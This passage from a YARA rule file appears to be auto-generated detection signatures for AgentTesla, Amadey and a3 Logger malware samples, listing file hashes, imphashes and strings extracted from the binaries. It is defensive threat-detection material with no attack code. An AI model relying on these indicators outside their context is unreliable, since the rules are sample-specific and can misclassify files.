      $s12 = "get_MdiMaximizeBox" fullword ascii /* score: '9.00'*/
      $s13 = "1Gets or sets the alignment of of the form's icon." fullword ascii /* score: '9.00'*/
      $s14 = "get_IconTextRelation" fullword ascii /* score: '9.00'*/
      $s15 = "get_MetroColor" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6fa0b050_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_44 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6fa0b050.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bdf5b39c.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e1a0771b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6fa0b050220da5ddb2eff9651f6a4c53831364200c5f1671dbadcd8a421587df"
      hash2 = "bdf5b39c1043750eea85ce7c977a3cd25a8fee3cff91539ed99892a94833dff0"
      hash3 = "e1a0771b4e2b6524eee712641b99aa2890a5e3a7bd2664b70db58049a973a9e5"
   strings:
      $s1 = "get_PlainTextContent" fullword ascii /* score: '14.00'*/
      $s2 = "GetPlainTextContent" fullword ascii /* score: '14.00'*/
      $s3 = "get_YouTube_Logo" fullword ascii /* score: '14.00'*/
      $s4 = "SmartNote - Intelligent Note Manager" fullword wide /* score: '12.00'*/
      $s5 = "Text files (*.txt)|*.txt|HTML files (*.html)|*.html" fullword wide /* score: '11.00'*/
      $s6 = "Error exporting notes: " fullword wide /* score: '10.00'*/
      $s7 = "<GetAllNotes>b__10_2" fullword ascii /* score: '9.00'*/
      $s8 = "<GetAllNotes>b__10_1" fullword ascii /* score: '9.00'*/
      $s9 = "GetAllNotes" fullword ascii /* score: '9.00'*/
      $s10 = "GetTimeSinceModified" fullword ascii /* score: '9.00'*/
      $s11 = "get_BackupEnabled" fullword ascii /* score: '9.00'*/
      $s12 = "get_StartWithWindows" fullword ascii /* score: '9.00'*/
      $s13 = "<GetRecentNotes>b__15_1" fullword ascii /* score: '9.00'*/
      $s14 = "get_BackupRetentionDays" fullword ascii /* score: '9.00'*/
      $s15 = "GetNotesByTag" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__14bedcf2_a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5_45 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_14bedcf2.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_37f4c5e7.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9aaec65c.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_53823787.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "14bedcf25ba0fa354fc7b8adf059130db692b7ccb54276bd43930f02aed4d9b6"
      hash2 = "37f4c5e75ad2232303971fc700edc714e87e3b097399d12942929da2c93994b0"
      hash3 = "9aaec65c036d7b320fb31cbc73bff93e135eb2e8d3780c4a6dff2b4a5421ec9c"
      hash4 = "53823787f8cd69b1887e545c1130de4c77a6939fed24d2753634704ae6aa1c90"
   strings:
      $s1 = "ExecuteArpCommand" fullword ascii /* score: '26.00'*/
      $s2 = "DNS flush command executed. Check command prompt for results." fullword wide /* score: '22.00'*/
      $s3 = "IP renewal command executed. This may take a moment to complete." fullword wide /* score: '22.00'*/
      $s4 = "Note: Full routing table display requires elevated privileges." fullword wide /* score: '19.00'*/
      $s5 = "Scan Completed: {0:yyyy-MM-dd HH:mm:ss}" fullword wide /* score: '13.00'*/
      $s6 = "This will attempt to renew IP configuration. Continue?" fullword wide /* score: '13.00'*/
      $s7 = "get_OpenPorts" fullword ascii /* score: '12.00'*/
      $s8 = "Error scanning network: {0}" fullword wide /* score: '12.00'*/
      $s9 = "ScanCommonPorts" fullword ascii /* score: '11.00'*/
      $s10 = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True" fullword wide /* score: '11.00'*/
      $s11 = "/c ipconfig /flushdns" fullword wide /* score: '11.00'*/
      $s12 = "/c ipconfig /release & ipconfig /renew" fullword wide /* score: '11.00'*/
      $s13 = "SmartNetworkAnalyzer.Forms.NetworkConfigForm.resources" fullword ascii /* score: '10.00'*/
      $s14 = "Ping failed: {0}" fullword wide /* score: '10.00'*/
      $s15 = "Scanning common ports..." fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Amadey_signature__646167cce332c1c252cdcb1839e0cf48_imphash__Amadey_signature__646167cce332c1c252cdcb1839e0cf48_imphash__3f7_46 {
   meta:
      description = "_subset_batch - from files Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash).exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_3f7a4573.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_4b21f1e3.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_68405cde.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_6e0b04fb.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_9395adeb.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_a7c433cb.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_b737fb32.exe, Amadey(signature)_646167cce332c1c252cdcb1839e0cf48(imphash)_be9dd4f3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d6e0b21902f5a71cb2b6f013b75ea8840b797dac5ee887707b3fa53ed2f5681f"
      hash2 = "3f7a457324893c033e7c5db5e31cdf188346ed1c8716445745e54e6fe9ff9152"
      hash3 = "4b21f1e31ffadc5abe05030450d8dddc6375b86435b4408b6b816d33963631b0"
      hash4 = "68405cde69c052fd15592a772942ae34cdcb623f1b2b012e15129871d1f4da8f"
      hash5 = "6e0b04fbb5e05635c097cbecd9426e967c9ce1a79b1d60f0e6526048efc7da91"
      hash6 = "9395adeb98472e3f89a5483aa5b3d567001384fb61f581539ebb450a5d06e909"
      hash7 = "a7c433cb43e79e8f98f0d096397f9382ea785b114d255b81b8dfea6337aaf1a3"
      hash8 = "b737fb32d0bea4c20f3cd3fdc9139b7bbd001c6a5b534fddc6b68b4d3cf25532"
      hash9 = "be9dd4f3f02b114a25b98bacf4c04b1ac917a53831146418d929772286728602"
   strings:
      $s1 = " Shell32.DLL " fullword wide /* score: '24.00'*/
      $s2 = " OpenProcessToken.3" fullword wide /* score: '18.00'*/
      $s3 = " advpack.dll.H" fullword wide /* score: '16.00'*/
      $s4 = " Command /?." fullword wide /* score: '14.00'*/
      $s5 = "     processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s6 = "  <description>IExpress extraction tool</description>" fullword ascii /* score: '10.00'*/
      $s7 = "DSystem\\CurrentControlSet\\Control\\Session Manager" fullword ascii /* score: '10.00'*/
      $s8 = "          processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s9 = " Windows NT." fullword wide /* score: '9.00'*/
      $s10 = "/Q -- " fullword wide /* score: '9.00'*/
      $s11 = "/C -- " fullword wide /* score: '9.00'*/
      $s12 = "  <assemblyIdentity version=\"5.1.0.0\"" fullword ascii /* score: '8.00'*/
      $s13 = " GetProcAddress() " fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and pe.imphash() == "646167cce332c1c252cdcb1839e0cf48" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imph_47 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash2 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089g#" fullword ascii /* score: '27.00'*/
      $s2 = "ShouldExitLoopvSystem.Collections.Generic.ICollection<TKey>.get_IsReadOnly`System.Collections.Generic.ICollection<TKey>.Add@" fullword ascii /* score: '21.00'*/
      $s3 = ".ThrowForFailedGetResult SignalCompletionpSystem.Collections.Generic.ICollection<T>.get_IsReadOnlyXSystem.Collections.Generic.IL" ascii /* score: '18.00'*/
      $s4 = "2<Reserved7>e__FixedBuffer$ShellExecuteHelper" fullword ascii /* score: '18.00'*/
      $s5 = ".ThrowForFailedGetResult SignalCompletionpSystem.Collections.Generic.ICollection<T>.get_IsReadOnlyXSystem.Collections.Generic.IL" ascii /* score: '18.00'*/
      $s6 = "26TryGetTypeTemplate_Internal" fullword ascii /* score: '16.00'*/
      $s7 = "3.ReflectionCoreExecution" fullword ascii /* score: '16.00'*/
      $s8 = "2*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s9 = "22InitializeExecutionDomain" fullword ascii /* score: '16.00'*/
      $s10 = "@SecureStringToGlobalAllocUnicode&StringToHGlobalAnsi$StringToHGlobalUni(StringToCoTaskMemUni*StringToCoTaskMemAnsi,GetHRForLast" ascii /* score: '15.00'*/
      $s11 = "InsertXSystem.Collections.IEnumerable.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s12 = "ProcessInfo ProcessStartInfo" fullword ascii /* score: '15.00'*/
      $s13 = "Win32Error*ZeroFreeCoTaskMemUTF84ZeroFreeGlobalAllocUnicode0GetSystemMaxDBCSCharSize" fullword ascii /* score: '15.00'*/
      $s14 = "TryGetLastpSystem.Collections.Generic.ICollection<System.Int32>.AddjSystem.Collections.Generic.IList<System.Int32>.Insert" fullword ascii /* score: '15.00'*/
      $s15 = "22GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008ca694_imphash__AgentTesla_signature__25e306_48 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash3 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash4 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash5 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash6 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash7 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s2 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s3 = "System.Runtime.CompilerService" fullword wide /* score: '20.00'*/
      $s4 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s5 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s6 = ",System.ObjectModel.dllFSystem.ComponentModel.TypeConverter" fullword ascii /* score: '19.00'*/
      $s7 = "2GetRuntimeTypeBypassCache" fullword ascii /* score: '19.00'*/
      $s8 = "<TryGetPointerTypeForTargetType0GetPointerTypeTargetTypeLTryGetFunctionPointerTypeForComponents@" fullword ascii /* score: '17.00'*/
      $s9 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '17.00'*/
      $s10 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '16.00'*/
      $s11 = "System.Resources.UseSystemResourceKey" fullword wide /* score: '13.00'*/
      $s12 = "SmtpPermission.SmtpPermissionAttribute0NetworkInformationAccess8NetworkInformationPermissionJNetworkInformationPermissionAttribu" ascii /* score: '12.00'*/
      $s13 = "@TryGetMethodNameFromStartAddress@" fullword ascii /* score: '12.00'*/
      $s14 = "@GetFunctionPointerTypeComponents@" fullword ascii /* score: '12.00'*/
      $s15 = "SmtpPermission.SmtpPermissionAttribute0NetworkInformationAccess8NetworkInformationPermissionJNetworkInformationPermissionAttribu" ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d ) and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9cbefe68f395e67356e2a5d8d1b285c0_imphash__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__49 {
   meta:
      description = "_subset_batch - from files 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa02002f4cdb80fe881ccaad7626f3161e83490b276659ab01879e736f44540f"
      hash2 = "8f54612f441c4a18564e6badf5709544370715e4529518d04b402dcd7f11b0fb"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s3 = "runtime.getLoadLibraryEx" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s8 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getLoadLibrary" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.getStackMap" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.heapBits.forwardOrBoundary" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.getPageSize" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.getArgInfo" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.heapBits.forward" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__50 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
   strings:
      $s1 = "number of login attempts exceede" fullword wide /* score: '24.00'*/
      $s2 = "Octokit.dll" fullword ascii /* score: '23.00'*/
      $s3 = "ApiException,ApiValidationException,AuthorizationException2LegalRestrictionException<LoginAttemptsExceededException\"NotFoundExc" ascii /* score: '22.00'*/
      $s4 = "System.Linq.dll.System.Linq.Expressions" fullword ascii /* score: '22.00'*/
      $s5 = "ApiException,ApiValidationException,AuthorizationException2LegalRestrictionException<LoginAttemptsExceededException\"NotFoundExc" ascii /* score: '22.00'*/
      $s6 = ",System.Private.Uri.dll>System.Threading.Tasks.Parallel" fullword ascii /* score: '22.00'*/
      $s7 = "Maximum number of login attempts exceede" fullword wide /* score: '22.00'*/
      $s8 = "Expression.LogicalBinaryExpression,AssignBinaryExpressionDCoalesceConversionBinaryExpressionPOpAssignMethodConversionBinaryExpre" ascii /* score: '21.00'*/
      $s9 = "Expression.LogicalBinaryExpression,AssignBinaryExpressionDCoalesceConversionBinaryExpressionPOpAssignMethodConversionBinaryExpre" ascii /* score: '21.00'*/
      $s10 = "https://api.github.com" fullword wide /* score: '21.00'*/
      $s11 = "https://github.com" fullword wide /* score: '21.00'*/
      $s12 = "\"get_ClockDateTime8System.IComparable.CompareTo&FromUnixTimeSeconds" fullword ascii /* score: '19.00'*/
      $s13 = "IsCompatibleKeyDSystem.Collections.IDictionary.Add@" fullword ascii /* score: '19.00'*/
      $s14 = "ReleasesClient.RepoCollaboratorsClient$RepositoriesClient.RepositoryActionsClient0RepositoryBranchesClient0RepositoryCommentsCli" ascii /* score: '18.00'*/
      $s15 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstanceFInitializeClosedInstanceToInterfacePInitializeClosedInstanceW" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f_9bc109acfded2eaae2348204bcab5c1c58a91310539433649_51 {
   meta:
      description = "_subset_batch - from files 97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f.exe, 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b_a42eece4.macho, a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594_a9c83151.exe, b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa_b053ca27.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0"
      hash2 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash3 = "aa02002f4cdb80fe881ccaad7626f3161e83490b276659ab01879e736f44540f"
      hash4 = "a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b"
      hash5 = "8f54612f441c4a18564e6badf5709544370715e4529518d04b402dcd7f11b0fb"
      hash6 = "a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594"
      hash7 = "b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa"
   strings:
      $s1 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s2 = "runqhead" fullword ascii /* score: '16.00'*/
      $s3 = "runtimehash" fullword ascii /* score: '14.00'*/
      $s4 = "sweepgen" fullword ascii /* score: '13.00'*/
      $s5 = "pkghashes" fullword ascii /* score: '11.00'*/
      $s6 = "runqtail" fullword ascii /* score: '11.00'*/
      $s7 = "*runtime.sysmontick" fullword ascii /* score: '11.00'*/
      $s8 = "modulehashes" fullword ascii /* score: '11.00'*/
      $s9 = "runnext" fullword ascii /* score: '11.00'*/
      $s10 = "linktimehash" fullword ascii /* score: '11.00'*/
      $s11 = "*[]runtime.modulehash" fullword ascii /* score: '10.00'*/
      $s12 = "*runtime.mOS" fullword ascii /* score: '10.00'*/
      $s13 = "*runtime.TypeAssertionError" fullword ascii /* score: '10.00'*/
      $s14 = "*runtime.errorString" fullword ascii /* score: '10.00'*/
      $s15 = "*runtime.modulehash" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__168eb588_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_52 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_168eb588.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1ec85fc8.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2a8a729d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "168eb588a4e2f648bb92bec333cbd6a68e2de589a9d804f07933953a4ffc4d1b"
      hash2 = "1ec85fc809f0659a6b0d5ec96360eb167f377a2f36158b112d3417b8aa28c6d3"
      hash3 = "2a8a729d0e203b203a53c0b4ab591ef3aa3eb0fd45972297a2b597404ecef986"
   strings:
      $s1 = "UpdateLastLogin" fullword ascii /* score: '15.00'*/
      $s2 = "<LastLoginDate>k__BackingField" fullword ascii /* score: '15.00'*/
      $s3 = "   - Keep track of common errors" fullword wide /* score: '13.00'*/
      $s4 = "   - Get adequate sleep the night before" fullword wide /* score: '12.00'*/
      $s5 = "   - Question: Formulate questions about the content" fullword wide /* score: '12.00'*/
      $s6 = "   - Preview headings and subheadings first" fullword wide /* score: '12.00'*/
      $s7 = "   - Skimming: Get general overview" fullword wide /* score: '12.00'*/
      $s8 = "   - Makes it easier to get partial credit on exams" fullword wide /* score: '12.00'*/
      $s9 = "   - Plan your study sessions in advance" fullword wide /* score: '10.00'*/
      $s10 = "   - Use the Eisenhower Matrix (urgent/important)" fullword wide /* score: '10.00'*/
      $s11 = "   - Add keywords and questions in the cue column" fullword wide /* score: '10.00'*/
      $s12 = "   - Summarize key points at the bottom" fullword wide /* score: '10.00'*/
      $s13 = "   - Indent supporting details under main points" fullword wide /* score: '10.00'*/
      $s14 = "   - Identify weak areas and focus study time there" fullword wide /* score: '10.00'*/
      $s15 = "   - Share different perspectives and approaches" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signature__5ba0e07214b3423072c72a6e1cb6e11f_imph_53 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash2 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
   strings:
      $s1 = "        publickeublickeykeytokenretargetrgetablecontentttenttypewindowsrsruntime" fullword wide /* score: '28.00'*/
      $s2 = "System.Linq.Expressions, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" fullword wide /* score: '27.00'*/
      $s3 = "System.Collections.Generic.IEnumerator<System.Linq.Expressions.Interpreter.InterpretedFrameInfo>.get_Current@" fullword ascii /* score: '18.00'*/
      $s4 = "xSystem.Collections.Generic.IDictionary<TKey,TValue>.get_Keys|System.Collections.Generic.IDictionary<TKey,TValue>.get_Values@" fullword ascii /* score: '18.00'*/
      $s5 = "*ProcessorArchitecture&AssemblyContentType\"AssemblyNameFlags\"AssemblyNameParts" fullword ascii /* score: '16.00'*/
      $s6 = "GetEmptyIfEmpty" fullword ascii /* score: '16.00'*/
      $s7 = "DReflectionExecutionDomainCallbacks&TypeLoaderCallbacks6StackTraceMetadataCallbacks.DynamicDelegateAugmentsY" fullword ascii /* score: '16.00'*/
      $s8 = "@GetRuntimeMethodHandleComponents>GetRuntimeFieldHandleComponents@" fullword ascii /* score: '15.00'*/
      $s9 = "4ParseProcessorArchitecture@" fullword ascii /* score: '15.00'*/
      $s10 = " VisitLabelTarget@" fullword ascii /* score: '14.00'*/
      $s11 = "get_Target$InternalEqualTypes" fullword ascii /* score: '14.00'*/
      $s12 = "invokerg" fullword ascii /* score: '12.00'*/
      $s13 = "0get_RuntimeDeclaringType@" fullword ascii /* score: '12.00'*/
      $s14 = " 4<get_CustomAttributes>d__2>NativeFormatMethodParameterInfo>NativeFormatRuntimePropertyInfo8NativeFormatRuntimeFieldInfo8Native" ascii /* score: '12.00'*/
      $s15 = "get_HasVHasValueget_Valuet_ValueGetHashCHashCodeToString;" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__636312a5ec1f8b9f790598a6e097c5a4_imphash__AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imph_54 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash2 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|42_2d<ReduceAlternation>g__ExtractCommonPrefixText|42_3X<ReduceAlternat" ascii /* score: '22.00'*/
      $s2 = "The System.Text.Json library is built-in as part of the shared framework in .NET Runtime. The package can be installed when you " ascii /* score: '19.00'*/
      $s3 = "need to use it in other target frameworks." fullword ascii /* score: '17.00'*/
      $s4 = "4<FindPrefix>g__Process|1_0" fullword ascii /* score: '15.00'*/
      $s5 = "IdManager$FinalizationHelper\"WorkStealingQueue(QueueProcessingStage" fullword ascii /* score: '15.00'*/
      $s6 = "ion>g__ProcessOneOrMulti|42_4" fullword ascii /* score: '15.00'*/
      $s7 = "&GetComponentsHelper" fullword ascii /* score: '12.00'*/
      $s8 = "x<ReduceAlternation>g__RemoveRedundantEmptiesAndNothings|42_2d<ReduceAlternation>g__ExtractCommonPrefixText|42_3X<ReduceAlternat" ascii /* score: '11.00'*/
      $s9 = "System.Text.Json.Serialization.EnableSourceGenReflectionFallbac" fullword wide /* score: '10.00'*/
      $s10 = "System.Text.Json.Serialization.RespectNullableAnnotationsDefaul" fullword wide /* score: '10.00'*/
      $s11 = "System.Text.Json.Serialization.RespectRequiredConstructorParametersDefaul" fullword wide /* score: '10.00'*/
      $s12 = "get_IsOneFamily$get_IsNotoneFamily" fullword ascii /* score: '9.00'*/
      $s13 = ".TryGetUnicodeEquivalent" fullword ascii /* score: '9.00'*/
      $s14 = "$get_IsValueCreated" fullword ascii /* score: '9.00'*/
      $s15 = " GetMintermFromId" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f63101d1_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_55 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f63101d1.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_745fa2ad.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b8d63946.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f63101d19ea6db33f5cae1fe3609805e0c9daa02b6e948465ce674e2c89df8f2"
      hash2 = "745fa2ad40de39e3a4e6d27d26099cd2d6158dfc96950bac409e6aa508a2b87b"
